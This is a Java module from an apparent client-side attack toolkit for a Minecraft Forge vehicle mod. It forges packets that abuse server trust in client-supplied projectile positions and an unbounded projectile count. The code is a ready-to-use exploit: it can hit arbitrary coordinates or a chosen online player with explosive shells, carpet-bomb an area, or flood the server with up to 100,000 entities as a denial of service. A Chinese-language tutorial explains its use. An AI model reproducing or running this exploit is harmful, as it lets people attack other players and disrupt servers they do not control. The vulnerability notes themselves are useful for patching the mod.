package com.redblue.red.modules.limitlessvehicle;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.client.player.AbstractClientPlayer;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.phys.Vec3;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * LV-02 + LV-03: Client-authoritative shooting -- arbitrary projectile spawn
 * position/direction + unbounded aimContexts list for ammo multiplication / DoS.
 *
 * LV-02 (CONFIRMED): VehicleCannon.shoot() and VehicleRocket.shoot() directly use
 *   client-provided aimContext.position as BulletEntity/RocketEntity spawn location
 *   and aimContext.direction as flight direction. No server-side validation.
 *
 * LV-03 (CONFIRMED): ClientVehicleAction.decode() reads aimContexts count via
 *   readInt() with NO upper bound. Each AimContext spawns one projectile entity.
 *   consumeAmmo() truncates to remaining ammo but still spawns that many entities.
 *
 * Wire format (index 101, shoot branch):
 *   writeByte(101)                    // discriminator
 *   writeInt(vehicleEntityId)
 *   writeBoolean(false)              // leaveVehicle
 *   writeBoolean(false)              // toggleEngine
 *   writeBoolean(false)              // lockEntity
 *   writeInt(partUnitIndex)
 *   writeBoolean(true)               // shoot=true
 *   writeInt(aimContextCount)
 *   [writeFloat(posX) + writeFloat(posY) + writeFloat(posZ)
 *    + writeFloat(dirX) + writeFloat(dirY)] * N
 *   writeInt(weaponIndex)
 *
 * Requires: sender must be seated in a weapon seat on the target vehicle.
 * PartUnit.onClientMessageReceived checks partUnitIndex < partUnits.size()
 * but does NOT check >= 0 (LV-09), and does NOT check sender is operator.
 */
public class LV02_ArtilleryStrike implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ywzj_vehicle", "ywzj_vehicle_channel");
    private static final int IDX_VEHICLE_ACTION = 101;

    private final List<ConfigParam> params = List.of(
        // --- Basic ---
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "攻击模式", "SNIPE", "SNIPE", "BARRAGE", "DOS"),
        ConfigParam.ofEntity("vehicle_id", "所乘载具"),
        ConfigParam.ofInt("part_index", "武器部件索引", 0, 0, 15),
        ConfigParam.ofInt("weapon_index", "武器槽索引", 0, 0, 15),
        // --- Coordinate source ---
        ConfigParam.ofEnum("coord_source", "坐标来源", "LOOK_AT",
                        "CUSTOM", "PLAYER_POS", "PLAYER_TARGET", "LOOK_AT")
                .visibleWhen("mode", "SNIPE", "BARRAGE"),
        // CUSTOM: manual coordinate entry
        ConfigParam.ofFloat("target_x", "目标X", 0f, -30000000f, 30000000f)
                .visibleWhen("coord_source", "CUSTOM"),
        ConfigParam.ofFloat("target_y", "目标Y", 64f, -64f, 320f)
                .visibleWhen("coord_source", "CUSTOM"),
        ConfigParam.ofFloat("target_z", "目标Z", 0f, -30000000f, 30000000f)
                .visibleWhen("coord_source", "CUSTOM"),
        // CUSTOM: manual direction (other sources auto-calculate downward)
        ConfigParam.ofFloat("dir_x", "方向Pitch", 90f, -90f, 90f)
                .visibleWhen("coord_source", "CUSTOM"),
        ConfigParam.ofFloat("dir_y", "方向Yaw", 0f, -180f, 180f)
                .visibleWhen("coord_source", "CUSTOM"),
        // PLAYER_TARGET: pick an online player
        ConfigParam.ofPlayer("target_player", "目标玩家")
                .visibleWhen("coord_source", "PLAYER_TARGET"),
        // LOOK_AT: project along look direction
        ConfigParam.ofInt("look_distance", "视线距离(格)", 100, 10, 1000)
                .visibleWhen("coord_source", "LOOK_AT"),
        // --- Mode-specific ---
        ConfigParam.ofInt("barrage_count", "弹幕数量", 10, 1, 100)
                .visibleWhen("mode", "BARRAGE"),
        ConfigParam.ofFloat("spread", "散布半径", 5f, 0f, 50f)
                .visibleWhen("mode", "BARRAGE"),
        ConfigParam.ofBool("confirm_dos", "确认: 可能导致服务器卡顿", false)
                .visibleWhen("mode", "DOS"),
        ConfigParam.ofInt("dos_count", "实体生成数量", 1000, 100, 100000)
                .visibleWhen("mode", "DOS"),
        // --- Timing ---
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "lv02_artillery_strike"; }
    @Override public String name() { return "全图炮击"; }
    @Override public String description() { return "客户端控制弹丸生成位置，可在任意坐标发射爆炸弹丸"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "前提: 你必须坐在载具的武器位上\n"
            + "1. 用准星选取按钮(实体选取器)对准你所乘坐的载具，自动填入载具ID\n"
            + "2. 设置武器部件索引和武器槽索引(通常都是0)\n"
            + "3. 选择攻击模式:\n"
            + "   SNIPE - 在指定坐标生成单发弹丸(全图精确打击)\n"
            + "   BARRAGE - 在目标周围散布多发弹丸(区域轰炸)\n"
            + "   DOS - 发送大量aimContexts生成海量实体(服务器DoS)\n"
            + "4. 选择坐标来源(SNIPE/BARRAGE模式):\n"
            + "   LOOK_AT - 视线方向投射，可设置距离(推荐)\n"
            + "   PLAYER_TARGET - 选择在线玩家作为目标\n"
            + "   PLAYER_POS - 使用自己当前位置\n"
            + "   CUSTOM - 手动输入坐标和方向\n"
            + "   (非CUSTOM模式下方向自动设为垂直向下)\n"
            + "5. 点击执行\n\n"
            + "[漏洞原理]\n"
            + "LV-02: 服务端直接使用客户端提供的position/direction生成弹丸\n"
            + "LV-03: aimContexts列表大小由readInt()决定，无上限";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ywzj_vehicle");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        doShoot(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doShoot(mc);
    }

    private void doShoot(Minecraft mc) {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("SNIPE");
        int vehicleId = getParam("vehicle_id").map(ConfigParam::getInt).orElse(0);
        if (vehicleId == 0) return;
        int partIdx = getParam("part_index").map(ConfigParam::getInt).orElse(0);
        int weaponIdx = getParam("weapon_index").map(ConfigParam::getInt).orElse(0);

        switch (mode) {
            case "SNIPE" -> sendSnipe(mc, vehicleId, partIdx, weaponIdx);
            case "BARRAGE" -> sendBarrage(mc, vehicleId, partIdx, weaponIdx);
            case "DOS" -> sendDoS(mc, vehicleId, partIdx, weaponIdx);
        }
    }

    private float[] getTargetCoords(Minecraft mc) {
        String src = getParam("coord_source").map(ConfigParam::getString).orElse("CUSTOM");
        switch (src) {
            case "PLAYER_POS" -> {
                if (mc.player != null) {
                    return new float[]{
                        (float) mc.player.getX(),
                        (float) mc.player.getY(),
                        (float) mc.player.getZ()
                    };
                }
            }
            case "PLAYER_TARGET" -> {
                String targetName = getParam("target_player").map(ConfigParam::getString).orElse("");
                if (!targetName.isEmpty() && mc.level != null) {
                    for (AbstractClientPlayer p : mc.level.players()) {
                        if (p.getGameProfile().getName().equalsIgnoreCase(targetName)) {
                            return new float[]{
                                (float) p.getX(),
                                (float) p.getY(),
                                (float) p.getZ()
                            };
                        }
                    }
                }
            }
            case "LOOK_AT" -> {
                if (mc.player != null) {
                    int dist = getParam("look_distance").map(ConfigParam::getInt).orElse(100);
                    Vec3 eye = mc.player.getEyePosition(1.0f);
                    Vec3 look = mc.player.getLookAngle();
                    Vec3 target = eye.add(look.scale(dist));
                    return new float[]{(float) target.x, (float) target.y, (float) target.z};
                }
            }
        }
        // CUSTOM fallback
        return new float[]{
            getParam("target_x").map(ConfigParam::getFloat).orElse(0f),
            getParam("target_y").map(ConfigParam::getFloat).orElse(64f),
            getParam("target_z").map(ConfigParam::getFloat).orElse(0f)
        };
    }

    /** Returns {pitch, yaw}. CUSTOM uses manual values; others default to straight down (90,0). */
    private float[] getDirection() {
        String src = getParam("coord_source").map(ConfigParam::getString).orElse("CUSTOM");
        if ("CUSTOM".equals(src)) {
            return new float[]{
                getParam("dir_x").map(ConfigParam::getFloat).orElse(90f),
                getParam("dir_y").map(ConfigParam::getFloat).orElse(0f)
            };
        }
        // Artillery-style: straight down
        return new float[]{90f, 0f};
    }

    /** LV-02: Single precise shot at arbitrary world coordinates */
    private void sendSnipe(Minecraft mc, int vehicleId, int partIdx, int weaponIdx) {
        float[] pos = getTargetCoords(mc);
        float[] dir = getDirection();

        sendShootPacket(vehicleId, partIdx, weaponIdx, new float[][]{{pos[0], pos[1], pos[2], dir[0], dir[1]}});
    }

    /** LV-02: Multiple shots spread around target */
    private void sendBarrage(Minecraft mc, int vehicleId, int partIdx, int weaponIdx) {
        float[] pos = getTargetCoords(mc);
        float[] dir = getDirection();
        int count = getParam("barrage_count").map(ConfigParam::getInt).orElse(10);
        float spread = getParam("spread").map(ConfigParam::getFloat).orElse(5f);

        float[][] contexts = new float[count][5];
        for (int i = 0; i < count; i++) {
            float offsetX = (float) (Math.random() * 2 - 1) * spread;
            float offsetZ = (float) (Math.random() * 2 - 1) * spread;
            contexts[i] = new float[]{pos[0] + offsetX, pos[1], pos[2] + offsetZ, dir[0], dir[1]};
        }
        sendShootPacket(vehicleId, partIdx, weaponIdx, contexts);
    }

    /** LV-03: Massive aimContexts to spawn excessive entities */
    private void sendDoS(Minecraft mc, int vehicleId, int partIdx, int weaponIdx) {
        boolean confirmed = getParam("confirm_dos").map(ConfigParam::getBool).orElse(false);
        if (!confirmed) return;

        int count = getParam("dos_count").map(ConfigParam::getInt).orElse(1000);
        float px = (float) mc.player.getX();
        float py = (float) mc.player.getY();
        float pz = (float) mc.player.getZ();

        float[][] contexts = new float[count][5];
        for (int i = 0; i < count; i++) {
            contexts[i] = new float[]{px, py + 10, pz, 90f, 0f};
        }
        sendShootPacket(vehicleId, partIdx, weaponIdx, contexts);
    }

    private void sendShootPacket(int vehicleId, int partIdx, int weaponIdx, float[][] aimContexts) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_VEHICLE_ACTION);
            buf.writeInt(vehicleId);       // vehicleEntityId
            buf.writeBoolean(false);       // leaveVehicle
            buf.writeBoolean(false);       // toggleEngine
            buf.writeBoolean(false);       // lockEntity
            buf.writeInt(partIdx);         // partUnitIndex
            buf.writeBoolean(true);        // shoot=true
            buf.writeInt(aimContexts.length); // aimContext count
            for (float[] ctx : aimContexts) {
                buf.writeFloat(ctx[0]);    // posX
                buf.writeFloat(ctx[1]);    // posY
                buf.writeFloat(ctx[2]);    // posZ
                buf.writeFloat(ctx[3]);    // dirX (pitch)
                buf.writeFloat(ctx[4]);    // dirY (yaw)
            }
            buf.writeInt(weaponIdx);       // weaponIndex
        });
    }
}
